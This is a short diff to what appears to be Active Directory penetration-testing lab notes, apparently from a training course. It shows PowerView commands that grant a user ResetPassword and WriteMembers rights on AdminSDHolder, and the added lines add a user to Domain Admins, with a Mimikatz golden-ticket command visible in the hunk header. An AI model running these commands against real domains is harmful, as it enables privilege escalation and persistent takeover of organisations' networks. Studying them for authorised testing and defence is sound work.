@@ -492,3 +492,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
 **Other interesting permissions (ResetPassword, WriteMembers) for a user to the AdminSDHolder**
 - `Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSAMAccountName student1 -Rights ResetPassword -Verbose`
 - `Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSAMAccountName student1 -Rights WriteMembers -Verbose`
+
+- After having full control over the Domain, we can add the members in Domain Admin Groups
+- Using PowerView: `Add-DomainGroupMember -Identity 'Domain Admins' -Members testuser -Verbose`
+- Using AD Module: `Add-ADGroupMember -Identity 'Domain Admins' -Members testuser`
